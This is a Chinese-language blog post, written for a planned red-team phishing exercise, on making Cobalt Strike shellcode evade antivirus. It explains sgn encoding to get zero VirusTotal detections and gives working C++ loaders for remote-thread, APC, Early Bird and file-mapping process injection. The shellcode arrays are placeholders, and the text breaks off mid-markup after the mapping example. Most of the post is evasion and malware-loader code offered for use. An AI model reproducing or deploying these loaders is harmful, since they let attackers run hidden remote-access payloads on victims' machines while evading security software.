<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="shutTD" href="https://shut-td.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="shutTD" href="https://shut-td.github.io/atom.xml"><link rel="alternate" type="application/json" title="shutTD" href="https://shut-td.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="免杀"><link rel="canonical" href="https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/"><title>CS 远控免杀思路与实现 - 免杀 | shutTD's BLOG = shutTD = Cyber AD</title><meta name="generator" content="Hexo 7.0.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">CS 远控免杀思路与实现</h1><div class="meta"><span class="item" title="创建时间：2024-07-16 10:13:27"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2024-07-16T10:13:27+08:00">2024-07-16</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>15k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>14 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">shutTD's BLOG</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="http://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hnqog3ggb2j31hc0u0qjv.jpg"></li><li class="item" data-background-image="http://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqx14nahdj31hc0u041l.jpg"></li><li class="item" data-background-image="http://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnqofyx2uuj31ht0u0n0e.jpg"></li><li class="item" data-background-image="http://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqx1erukaj31hc0u047x.jpg"></li><li class="item" data-background-image="http://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hnqog23v9bj30u00lpn0d.jpg"></li><li class="item" data-background-image="http://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hnqx19xgpfj31hc0u07b0.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%85%8D%E6%9D%80/" itemprop="item" rel="index" title="分类于 免杀"><span itemprop="name">免杀</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="shutTD"><meta itemprop="description" content="Cyber AD, 菜只因～"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="shutTD"></span><div class="body md" itemprop="articleBody"><h3 id="cs原生shellcode上线免杀"><a class="anchor" href="#cs原生shellcode上线免杀">#</a> CS 原生 shellcode 上线免杀</h3><p>最近攻防在即所以想要尝试写免杀🐎钓钓鱼，所以小学了一手一些比较好用且免杀效果比较好的手法做一下总结，从几个角度去组合免杀。</p><h5 id="shellcode免杀"><a class="anchor" href="#shellcode免杀">#</a> shellcode 免杀</h5><p>sgn 编码 (内存自解密)，可以很好的做到静态免杀的效果不需要做其他任何加密手段即可做到静态免杀，可以尝试 sgn 编码后传 vt 一般就是 0 查杀。</p><p>用法：将 shellcode 二进制文件例如 xx.bin 保存，使用 sgn.exe 进行编码，需要注意的是系统位数要对</p><p><strong>原始 shellcode</strong> (用 winhex 等二进制编辑器打开):<img data-src="https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hrpo6edkdoj30hk0drwk8.jpg" alt=""><br><strong>sgn 进行编码</strong>:<img data-src="https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpo6it3a1j30v10apmyj.jpg" alt=""><br><strong>编码后的 shellcode</strong>:<img data-src="https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpo6ptt93j30rs0t819n.jpg" alt=""></p><p>这种静态免杀效果很好基本上无需做其他任何加密处理，同时还做到了降熵，当然这里还可以将二进制文件托管到服务器上然后通过 http 请求来获取 shellcode，也可以配合图片隐写进行 shellcode 的隐藏。</p><h4 id="代码与进程注入手法"><a class="anchor" href="#代码与进程注入手法">#</a> 代码与进程注入手法</h4><p><em><strong>CreateRemoteThread (远程线程注入)</strong></em><br>注入流程：<br>1、根据进程名寻找 pid，用于后续进程注入<br>2、根据 pid 打开指定进程句柄<br>3、向指定进程申请可读可写可执行的内存区域<br>4、将 shellcode 或 dll 注入到该内存区域中<br>5、开辟一个新线程执行</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessIdByName</span><span class="params">(LPCTSTR lpszProcessName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span> pe;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32First</span>(hSnapshot, &amp;pe))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">lstrcmpi</span>(lpszProcessName, pe.szExeFile) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">                <span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">                <span class="keyword">return</span> pe.th32ProcessID;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapshot, &amp;pe));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> path[] = <span class="string">&quot;C:\\xxx\\TestDll.dll&quot;</span>;   <span class="comment">//dll注入</span></span><br><span class="line"><span class="type">char</span> shellcode[] = &#123;\x12&#125;;  <span class="comment">//shellcode注入 </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DllInjectMain</span><span class="params">()</span> <span class="comment">//dll注入</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, <span class="built_in">GetProcessIdByName</span>((LPCTSTR)<span class="string">&quot;notepad.exe&quot;</span>));    </span><br><span class="line">    LPVOID lpBaseAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, <span class="number">0x1000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, lpBaseAddress, path, <span class="built_in">sizeof</span>(path), <span class="literal">NULL</span>);</span><br><span class="line">    LPTHREAD_START_ROUTINE pLoadlibrary = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pLoadlibrary, lpBaseAddress, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="type">int</span> <span class="title">ShellcodeInjectMain</span><span class="params">()</span></span>&#123;   <span class="comment">//shellcode注入</span></span><br><span class="line">      HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, <span class="built_in">GetProcessIdByName</span>((LPCTSTR)<span class="string">&quot;notepad.exe&quot;</span>));</span><br><span class="line">      LPVOID lpBaseAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, <span class="number">0x1000</span>(或者<span class="keyword">sizeof</span> shellcdoe), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">      <span class="built_in">WriteProcessMemory</span>(hProcess, lpBaseAddress, shellcode, <span class="built_in">sizeof</span>(shellcode), <span class="literal">NULL</span>);</span><br><span class="line">      <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpBaseAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>这种直接的线程注入容易暴毙，建议搭配其他手段食用。<p></p><p><em><strong>APC Injection (APC 注入)</strong></em><br>每个线程都有自己的 APC 队列，应用程序通过调用<strong> QueueUserAPC</strong> 函数将 APC 排队到线程中，调用线程在对<strong> QueueUserAPC</strong> 的调用中指定 APC 函数的地址，当 APC 排队到线程中时，系统会发出软件中断。下次调度线程时，它将运行 APC 功能。<br>注入流程：<br>1、根据进程名确定 pid<br>2、通过 pid 遍历 tid<br>3、插入 APC 队列</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessIdByName</span><span class="params">(LPCTSTR lpszProcessName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span> pe;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32First</span>(hSnapshot, &amp;pe))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">lstrcmpi</span>(lpszProcessName, pe.szExeFile) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">                <span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">                <span class="keyword">return</span> pe.th32ProcessID;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapshot, &amp;pe));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">GetAllThreadIdByProcessId</span><span class="params">(DWORD dwProcessId)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwBufferLength = <span class="number">1000</span>;</span><br><span class="line">    THREADENTRY32 te32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HANDLE hSnapshot = <span class="literal">NULL</span>;</span><br><span class="line">    BOOL bRet = TRUE;</span><br><span class="line">    <span class="comment">// 获取线程快照</span></span><br><span class="line">    ::<span class="built_in">RtlZeroMemory</span>(&amp;te32, <span class="built_in">sizeof</span>(te32));</span><br><span class="line">    te32.dwSize = <span class="built_in">sizeof</span>(te32);</span><br><span class="line">    hSnapshot = ::<span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取第一条线程快照信息</span></span><br><span class="line">    bRet = ::<span class="built_in">Thread32First</span>(hSnapshot, &amp;te32);</span><br><span class="line">    <span class="keyword">while</span> (bRet)&#123;</span><br><span class="line">        <span class="comment">// 获取进程对应的线程ID</span></span><br><span class="line">        <span class="keyword">if</span> (te32.th32OwnerProcessID == dwProcessId)&#123;</span><br><span class="line">            <span class="keyword">return</span> te32.th32ThreadID;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 遍历下一个线程快照信息</span></span><br><span class="line">        bRet = ::<span class="built_in">Thread32Next</span>(hSnapshot, &amp;te32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DllInjdectMain</span><span class="params">()</span> </span>&#123;   <span class="comment">//dll注入</span></span><br><span class="line">    FARPROC pLoadLibrary = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line">    DWORD Threadid = <span class="number">0</span>;</span><br><span class="line">    DWORD ProcessId = <span class="number">0</span>;</span><br><span class="line">    BYTE DllName[] = <span class="string">&quot;C:\\Users\\Black Sheep\\source\\repos\\ApcInject\\x64\\Debug\\TestDll.dll&quot;</span>;</span><br><span class="line">    LPVOID AllocAddr = <span class="literal">NULL</span>;</span><br><span class="line">    ProcessId = <span class="built_in">GetProcessIdByName</span>(<span class="string">L&quot;explorer.exe&quot;</span>);</span><br><span class="line">    hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, ProcessId);</span><br><span class="line">    pLoadLibrary = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    AllocAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, <span class="built_in">sizeof</span>(DllName) + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, AllocAddr, DllName, <span class="built_in">sizeof</span>(DllName) + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    Threadid = <span class="built_in">GetAllThreadIdByProcessId</span>(ProcessId);</span><br><span class="line">    hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, <span class="number">0</span>, Threadid);</span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)AllocAddr);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ShellcodeInjectMain</span><span class="params">()</span></span>&#123;   <span class="comment">//shellcode注入</span></span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line">    DWORD Threadid = <span class="number">0</span>;</span><br><span class="line">    DWORD ProcessId = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> shellcode[] = &#123;\x12&#125;; <span class="comment">//shellcode</span></span><br><span class="line">    ProcessId = <span class="built_in">GetProcessIdByName</span>(<span class="string">L&quot;explorer.exe&quot;</span>);</span><br><span class="line">    hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, ProcessId);</span><br><span class="line">    LPVOID lpBaseeAddresss = (LPVOID)<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0X1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, lpBaseeAddresss, shellcode, <span class="built_in">sizeof</span>(shellcode) + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    Threadid = <span class="built_in">GetAllThreadIdByProcessId</span>(ProcessId);</span><br><span class="line">    hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, <span class="number">0</span>, Threadid);</span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)lpBaseeAddresss, hThread, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p><em><strong>Early Bird (进阶版 APC 注入)</strong></em><br>先创建一个挂起的白进程并申请一块 RWX 内存用于写入 shellcode，再使用 APC 注入插入线程，再恢复线程。实际上就是在白进程上偷摸注入一个新线程跑 shellcode。<br>注入流程跟上述 APC 注入差不多</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;<span class="string">&quot;\0x1&quot;</span>&#125;;  <span class="comment">//恶意shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    si.cb = <span class="built_in">sizeof</span>(STARTUPINFO);   </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">CreateProcessA</span>(<span class="string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_SUSPENDED | EMBDHLP_CREATENOW, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOA)&amp;si, &amp;pi);</span><br><span class="line">    LPVOID lpBaseeAddresss = (LPVOID)<span class="built_in">VirtualAllocEx</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="number">0X1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, lpBaseeAddresss, (LPVOID)shellcode, <span class="built_in">sizeof</span>(shellcode), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)lpBaseeAddresss, pi.hThread, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个免杀手法十分的好用，推荐再稍微搭配一下其他规避手段就可以绕过绝大多数杀软做到无感上线，实际代码和上线效果贴在文末。<p></p><p><em><strong>Mapping Injection (内存映射注入)</strong></em><br>先在物理内存中开辟一段空间用于写入恶意 shellcode，后续利用 MapViewOfFile2 将该恶意内存区域映射到指定进程中的虚拟内存中去，达到 shellcode 注入的效果。<br>注入流程：<br>1、创建 Mapping 句柄<br>2、将 shellcode 复制到该物理内存地址中去<br>3、将该段物理内存映射到虚拟内存中<br>4、利用任意方法执行到该地址的 shellcode</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;OneCore.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;<span class="number">0x12</span>&#125;;  <span class="comment">//shellcode</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">     PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">     si.cb = <span class="built_in">sizeof</span>(STARTUPINFO);</span><br><span class="line">     </span><br><span class="line">     HANDLE hMapping = <span class="built_in">CreateFileMapping</span>(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="number">0</span>, <span class="built_in">sizeof</span>(shellcode), <span class="literal">NULL</span>);</span><br><span class="line">     LPVOID lpMapAddress = <span class="built_in">MapViewOfFile</span>(hMapping, FILE_MAP_WRITE, <span class="number">0</span>, <span class="number">0</span>, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">     <span class="built_in">memcpy</span>((PVOID)lpMapAddress, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">     <span class="built_in">CreateProcessA</span>(<span class="string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOA)&amp;si, &amp;pi);</span><br><span class="line">     LPVOID lpMapAddressRemote = <span class="built_in">MapViewOfFile2</span>(hMapping, pi.hProcess, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, PAGE_EXECUTE_READ);</span><br><span class="line">     </span><br><span class="line">     <span class="built_in">QueueUserAPC</span>((PAPCFUNC)lpMapAddressRemote, pi.hThread, <span class="literal">NULL</span>);</span><br><span class="line">     <span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line">     <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">     <span class="built_in">CloseHandle</span>(hMapping);</span><br><span class="line">     <span class="built_in">UnmapViewOfFile</span>(lpMapAddress);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span 